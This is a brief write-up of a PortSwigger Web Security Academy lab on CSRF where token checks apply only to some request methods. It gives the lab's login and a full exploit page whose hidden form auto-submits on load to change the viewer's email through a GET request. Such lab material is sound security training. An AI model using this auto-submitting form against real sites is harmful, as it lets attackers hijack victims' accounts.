# CSRF where token validation depends on request method

## This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

## To solve the lab, use your exploit server to host an HTML page that uses a [CSRF attack](https://portswigger.net/web-security/csrf) to change the viewer's email address.

## You can log in to your own account using the following credentials: `wiener:peter`

### HINT:

```html
<html>
  <body>
    <form
      action="https://0aa900d10373edfe81cd75dd008f004f.web-security-academy.net/my-account/change-email"
      method="GET"
    >
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
